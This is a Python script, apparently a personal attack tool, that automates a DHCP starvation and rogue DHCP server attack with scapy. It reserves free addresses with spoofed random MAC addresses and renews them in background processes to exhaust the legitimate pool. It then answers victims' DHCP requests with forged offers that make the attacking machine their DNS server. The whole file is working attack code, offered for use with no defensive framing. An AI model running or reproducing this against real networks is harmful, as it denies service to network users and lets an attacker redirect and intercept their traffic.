#!/usr/bin/python3.9

#----------------------------------------------------------------------------
# Created By  : Ixod3
# Created Date : 07/12/22
# Last Modify date : 07/12/22
# version : 1.0
# ---------------------------------------------------------------------------

from multiprocessing import *
import scapy.all as scapy
import subprocess
import argparse
import random
import signal
import time
import sys
import os

# Parse command
parser = argparse.ArgumentParser()
parser.add_argument("-R","--roguedhcp", action='store_true', help="DHCP Spoofing attack")
parser.add_argument("-i","--interface", help="interface network export")
args = parser.parse_args()

# Disable traceback output
sys.tracebacklimit = 0

# DHCP DOS function (DHCP Spoofing attack)
def fct_keep_starvation(keep_ip, keep_mac, dhcp_ip, lease_time, hostname):
    while True:
        # Random sleep time
        time.sleep(lease_time-5)
        trans_id = random.randint(0, 0xFFFFFFFF)
        fct_dhcp_request(keep_mac, keep_ip, dhcp_ip, hostname, trans_id)


def fct_randon_mac():

    bytes_4 = hex(random.randint(0, 254))[2:]
    bytes_5 = hex(random.randint(0, 254))[2:]
    bytes_6 = hex(random.randint(0, 254))[2:]
    random_mac = str(f"fc:3c:2c:{bytes_4}:{bytes_5}:{bytes_6}")
    return random_mac

def handler(signum, frame):

    active = active_children()
    for child in active:
        child.terminate()
    exit(1)

signal.signal(signal.SIGINT, handler)

def fct_dhcp_Discover(dst_mac, dst_ip, src_mac, src_ip, hostname):
    
    # Set DHCP Discover request & Send
    random_id = random.randint(0, 0xFFFFFFFF)
    ether = scapy.Ether(src=src_mac, dst=dst_mac)
    ip = scapy.IP(src=src_ip, dst=dst_ip)
    udp = scapy.UDP(sport=68, dport=67)
    dhcp = scapy.DHCP(options=[('message-type', 'discover'), ('hostname', f"{hostname}"), 'end'])
    dst_mac_bytes = (int(dst_mac.replace(":", ""), 16).to_bytes(6, "big"))
    bootp= scapy.BOOTP(op=2, yiaddr=dst_ip, siaddr=src_ip, chaddr=dst_mac_bytes, xid=random_id)
    dhcp_offer = ether/ip/udp/bootp/dhcp
    scapy.sendp(dhcp_offer, verbose=0)
    print (f"Paquet send with Transaction ID : {random_id}")

def fct_dhcp_offer(dst_mac, dst_ip, src_mac, src_ip, gateway_ip, trans_id):
    
    # Set DHCP offer request & Send
    ether = scapy.Ether(src=src_mac, dst=dst_mac)
    ip = scapy.IP(src=src_ip, dst=dst_ip)
    udp = scapy.UDP(sport=67, dport=68)
    dhcp = scapy.DHCP(options=[('message-type', 'offer'), ('server_id', src_ip), ('lease_time', 86400), ('subnet_mask', "255.255.255.0"), ('router', gateway_ip), ('name_server', src_ip), 'end'])
    dst_mac_bytes = (int(dst_mac.replace(":", ""), 16).to_bytes(6, "big"))
    bootp= scapy.BOOTP(op=2, yiaddr=dst_ip, siaddr=src_ip, chaddr=dst_mac_bytes, xid=trans_id)
    dhcp_offer = ether/ip/udp/bootp/dhcp
    scapy.sendp(dhcp_offer, verbose=0)

def fct_dhcp_request(src_mac, src_ip, gateway_ip, hostname, trans_id):

    # Set DHCP request
    hostname = (f"poste_{src_ip.split('.')[3]}")

    ether = scapy.Ether(src=src_mac,dst="ff:ff:ff:ff:ff:ff")
    ip = scapy.IP(src=src_ip, dst="255.255.255.255")
    udp = scapy.UDP(sport=68, dport=67)
    src_mac_bytes = (int(src_mac.replace(":", ""), 16).to_bytes(6, "big"))
    bootp = scapy.BOOTP(op=1, ciaddr=src_ip, chaddr=src_mac_bytes, xid=trans_id)
    dhcp = scapy.DHCP(options=[('message-type', 'request'), ("client_id", b'\x01' + src_mac_bytes), ("param_req_list", (1), (2), (6), (12), (15), (26), (28), (121), (3), (33), (40), (41), (42), (119), (249), (252), (17)), ("max_dhcp_size", 1500), ("requested_addr", src_ip), ("server_id", gateway_ip), ('hostname', hostname), 'end'])
    dhcp_request = ether/ip/udp/bootp/dhcp
    scapy.sendp(dhcp_request, verbose=0)

def fct_dhcp_ack(dst_mac, dst_ip, src_mac, src_ip, gateway_ip, trans_id):
    
    # Set DHCP ACK request & Send
    ether = scapy.Ether(src=src_mac, dst=dst_mac)
    ip = scapy.IP(src=src_ip, dst=dst_ip)
    udp = scapy.UDP(sport=67, dport=68)
    dhcp = scapy.DHCP(options=[('message-type', 'ack'), ('server_id', src_ip), ('lease_time', 86400), ('subnet_mask', "255.255.255.0"), ('router', gateway_ip), ('name_server', src_ip), 'end'])
    dst_mac_bytes = (int(dst_mac.replace(":", ""), 16).to_bytes(6, "big"))
    bootp= scapy.BOOTP(op=2, yiaddr=dst_ip, siaddr=src_ip, chaddr=dst_mac_bytes, xid=trans_id)
    dhcp_ack = ether/ip/udp/bootp/dhcp
    scapy.sendp(dhcp_ack, verbose=0)

def fct_ARP_host_check(dst_ip, src_mac, src_ip, arp_reply):

    #pkt_arp = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(psrc="192.168.1.7", hwsrc="44:ff:28:d9:47:b3", pdst="192.168.1.14")
    pkt_arp = scapy.Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(psrc=src_ip, pdst=dst_ip)
    rep_arp = scapy.srp1(pkt_arp, verbose=False, timeout=0.5)
    try:
        arp_reply["reply"] = rep_arp[1].psrc
    except:
        arp_reply["reply"] = '0'
    
def fct_ICMP_host_check(dst_mac, dst_ip, src_mac, src_ip, icmp_reply):

    #pkt_icmp = scapy.Ether(dst='f2:53:f9:3e:32:a6',src='44:ff:28:d9:47:b3') / scapy.IP(dst='192.168.1.2',src='192.168.1.7') / scapy.ICMP()
    pkt_icmp = scapy.Ether(dst=dst_mac,src=src_mac) / scapy.IP(dst=dst_ip,src=src_ip) / scapy.ICMP()
    rep_icmp = scapy.srp1(pkt_icmp, verbose=False, timeout=1)
    try:
        icmp_reply["reply"] = rep_icmp[1].src
    except:
        icmp_reply["reply"] = '0'


# Rogue DHCP Attack
if args.roguedhcp:
    if args.interface:
        # Set color variables
        Orange = "\033[1;33m"
        Green = "\033[1;32m"
        Blue = "\033[1;34m"
        Red = "\033[1;31m"
        White = "\033[0m"

        random_mac_ip = fct_randon_mac()

        # Get interface value
        MY_ip = subprocess.check_output([f"sudo ifconfig {args.interface} | grep 'inet '"], universal_newlines=True, shell=True)
        MY_ip = MY_ip.split(" ")[9]
        MY_mac = subprocess.check_output([f"sudo ifconfig {args.interface} | grep 'ether '"], universal_newlines=True, shell=True)
        MY_mac = MY_mac.split(" ")[9]
        MY_gateway = subprocess.check_output([f"sudo ip r | grep 'default'"], universal_newlines=True, shell=True)
        MY_gateway = MY_gateway.split(" ")[2]
        MY_network = ip_network = (f"""{MY_ip.split(".")[0]}.{MY_ip.split(".")[1]}.{MY_ip.split(".")[2]}""")

        # Set promiscuitous interface
        os.system(f"sudo ifconfig {args.interface} promisc")

        # Set DHCP Discover request
        random_id = random.randint(0, 0xFFFFFFFF)
        ether = scapy.Ether(src=MY_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = scapy.IP(src="0.0.0.0", dst="255.255.255.255")
        udp = scapy.UDP(sport=68, dport=67)
        MY_mac_bytes = (int(MY_mac.replace(":", ""), 16).to_bytes(6, "big"))
        bootp = scapy.BOOTP(op=1, ciaddr='0.0.0.0', chaddr=MY_mac_bytes, xid=random_id)
        dhcp = scapy.DHCP(options=[('message-type', 'discover'), ('hostname', "random"), 'end'])
        dhcp_discover = ether/ip/udp/bootp/dhcp

        # Receive packet (1/2)
        sniff_offer = scapy.AsyncSniffer(count=1,filter=f"udp and port 68 and ether dst {MY_mac}", timeout=5)
        sniff_offer.start()
        time.sleep(0.5)

        # Send packet
        result_discover = scapy.sendp(dhcp_discover, verbose=0)

        # Receive packet (2/2)
        sniff_offer.join()
        results = sniff_offer.results
        legitime_dhcp_ip = results[0][scapy.IP].src
        legitime_dhcp_mac = results[0][scapy.Ether].src
        print (f"{Green}[+]{White} DHCP Server IP address is {legitime_dhcp_ip}")

        # Set variables
        cpt=1
        ip_ack = 0
        ip_nak = 0
        ip_used = 0
        avalaible_ip = []
        random_IP_list = ""

        while cpt != 16: # modify from 255 to 30 (30 first address) for quick test

            #request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=f"{ip_network}.{cpt}")
            #arp_noresponse = scapy.srp(request, timeout=0.2, retry=0, verbose=False)[1]
            manager = Manager()
            arp_reply = manager.dict()
            arp_request = Process(target=fct_ARP_host_check, args=(f"{ip_network}.{cpt}", MY_mac, MY_ip, arp_reply))
            arp_request.start()
            arp_request.join()
            check_arp = arp_reply.values()[0]

            #if arp_noresponse :
            if check_arp == '0' and (f"{ip_network}.{cpt}") != MY_ip:
                
                # receive DHCP ack (1/2)
                random_mac_addr = fct_randon_mac()
                sniff_ack = scapy.AsyncSniffer(count=1,filter=f"udp and port 68 and ether dst {random_mac_addr}", timeout=2)
                sniff_ack.start()
                time.sleep(0.5)

                # Set DHCP request
                random_id = random.randint(0, 0xFFFFFFFF)
                ether = scapy.Ether(src=random_mac_addr,dst="ff:ff:ff:ff:ff:ff")
                ip = scapy.IP(src="0.0.0.0", dst="255.255.255.255")
                udp = scapy.UDP(sport=68, dport=67)
                random_mac_bytes = (int(random_mac_addr.replace(":", ""), 16).to_bytes(6, "big"))
                bootp = scapy.BOOTP(op=1, ciaddr='0.0.0.0', chaddr=random_mac_bytes, xid=random_id)
                dhcp = scapy.DHCP(options=[('message-type', 'request'), ("client_id", b'\x01' + random_mac_bytes), ("param_req_list", (1), (2), (6), (12), (15), (26), (28), (121), (3), (33), (40), (41), (42), (119), (249), (252), (17)), ("max_dhcp_size", 1500), ("requested_addr", f"{ip_network}.{cpt}"), ("server_id", legitime_dhcp_ip), ('hostname', f"utilisateur_{cpt}"), 'end'])
                dhcp_request = ether/ip/udp/bootp/dhcp

                # Send "DHCP Request"
                scapy.sendp(dhcp_request, verbose=0)

                # receive DHCP ack (2/2)
                sniff_ack.join()
                result_ack = sniff_ack.results

                try:
                    reserved_ip = result_ack[0][scapy.IP].dst
                    lease_time = result_ack[0][scapy.DHCP].options[2][1]
                    #print (result_ack[0][scapy.DHCP].options)
                    print (f"{Green}[+]{White} IP {reserved_ip} is reserved (ACK) ", end="\r")
                    #lease_time = 30 # capturer le lease time dans une requete du DHCP legitimes
                    Process(target=fct_keep_starvation, args=(reserved_ip, random_mac_addr, legitime_dhcp_ip, lease_time, f"{ip_network}.{cpt}")).start()
                    random_IP_list += (f"and not ether host {random_mac_addr} ")
                    avalaible_ip.append(f"{reserved_ip}")
                    
                    ip_ack += 1

                except:
                    print (f"{Red}[x]{White} IP {ip_network}.{cpt} not reserved (NAK)", end="\r")
                    ip_nak += 1

            else:
                print (f"{Orange}[-]{White} IP {ip_network}.{cpt} already used (ARP)", end="\r")
                ip_used += 1

            cpt += 1

        print ("\n#---------------------Resume---------------------#")
        print (f"{Green}[+]{White} {ip_ack} Reserved | {Orange}[-]{White} {ip_used} Used | {Red}[x]{White} {ip_nak} Not reserved\n")

        print (f"{Blue}[~]{White} Listen network trafic to find DHCP Discover")

        ## Rogue DHCP services
        next_IP = 0
        while next_IP != len(avalaible_ip):
            print (f"{Blue}[~]{White} Next IP address available is {avalaible_ip[next_IP]}")

            # sniff asynchrone trafic
            sniff_pkt = scapy.sniff(count=1,filter=f"udp and src port 68 and dst port 67 and ether dst ff:ff:ff:ff:ff:ff and not ether src {MY_mac} {random_IP_list}")
            discover_mac = sniff_pkt[0][scapy.Ether].src
            pkt_dhcp_type = (sniff_pkt[0][scapy.BOOTP][scapy.DHCP].options[0][1])

            if pkt_dhcp_type == 1: # DHCP Discover

                print (f"{Blue}[~]{White} DHCP Discover was captured from {discover_mac}")
                fct_dhcp_offer(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, MY_gateway, sniff_pkt[0][scapy.BOOTP].xid)
                fct_dhcp_ack(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, MY_gateway, sniff_pkt[0][scapy.BOOTP].xid)

                manager = Manager()
                arp_reply = manager.dict()
                icmp_reply = manager.dict()
                arp_request = Process(target=fct_ARP_host_check, args=(avalaible_ip[next_IP], MY_mac, MY_ip, arp_reply))
                icmp_request = Process(target=fct_ICMP_host_check, args=(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, icmp_reply))
                arp_request.start()
                icmp_request.start()
                arp_request.join()
                icmp_request.join()
                check_arp = arp_reply.values()[0]
                check_icmp = icmp_reply.values()[0]

                if check_arp == '0' and check_icmp == '0':
                    
                    time.sleep(2)
                    manager = Manager()
                    arp_reply = manager.dict()
                    icmp_reply = manager.dict()
                    arp_request = Process(target=fct_ARP_host_check, args=(avalaible_ip[next_IP], MY_mac, MY_ip, arp_reply))
                    icmp_request = Process(target=fct_ICMP_host_check, args=(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, icmp_reply))
                    arp_request.start()
                    icmp_request.start()
                    arp_request.join()
                    icmp_request.join()
                    check_arp = arp_reply.values()[0]
                    check_icmp = icmp_reply.values()[0]

                if check_arp == '0' and check_icmp == '0':
                    print (f"{Red}[x]{White} Host {discover_mac} not connect\n")
                elif check_arp != '0':
                    print (f"{Green}[+]{White} Host {discover_mac} connect to {check_arp} (ARP)\n")
                    time.sleep(1)
                    next_IP += 1
                else:
                    print (f"{Green}[+]{White} Host {discover_mac} connect to {check_icmp} (ICMP)\n")
                    time.sleep(1)
                    next_IP += 1

            elif pkt_dhcp_type == 3: # DHCP Request

                print (f"{Blue}[~]{White} DHCP Request was captured from {discover_mac}")
                offer_mac = sniff_pkt[0][scapy.Ether].src
                offer_ip = sniff_pkt[0][scapy.IP].src
                fct_dhcp_ack(offer_mac, offer_ip, MY_mac, MY_ip, MY_gateway, sniff_pkt[0][scapy.BOOTP].xid)
                
                manager = Manager()
                arp_reply = manager.dict()
                icmp_reply = manager.dict()
                arp_request = Process(target=fct_ARP_host_check, args=(avalaible_ip[next_IP], MY_mac, MY_ip, arp_reply))
                icmp_request = Process(target=fct_ICMP_host_check, args=(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, icmp_reply))
                arp_request.start()
                icmp_request.start()
                arp_request.join()
                icmp_request.join()
                check_arp = arp_reply.values()[0]
                check_icmp = icmp_reply.values()[0]

                if check_arp == '0' and check_icmp == '0':
                    
                    time.sleep(2)
                    manager = Manager()
                    arp_reply = manager.dict()
                    icmp_reply = manager.dict()
                    arp_request = Process(target=fct_ARP_host_check, args=(avalaible_ip[next_IP], MY_mac, MY_ip, arp_reply))
                    icmp_request = Process(target=fct_ICMP_host_check, args=(discover_mac, avalaible_ip[next_IP], MY_mac, MY_ip, icmp_reply))
                    arp_request.start()
                    icmp_request.start()
                    arp_request.join()
                    icmp_request.join()
                    check_arp = arp_reply.values()[0]
                    check_icmp = icmp_reply.values()[0]

                if check_arp == '0' and check_icmp == '0':
                    print (f"{Red}[x]{White} Host {discover_mac} not connect\n")
                elif check_arp != '0':
                    print (f"{Green}[+]{White} (ARP) Host {discover_mac} connect to {check_arp}\n")
                    time.sleep(1)
                    next_IP += 1
                else:
                    print (f"{Green}[+]{White} (ICMP) Host {discover_mac} connect to {check_icmp}\n")
                    time.sleep(1)
                    next_IP += 1
                #next_IP += 1

    if not args.interface:
        print ("To see help use command : \n       python3 attack.py --help")
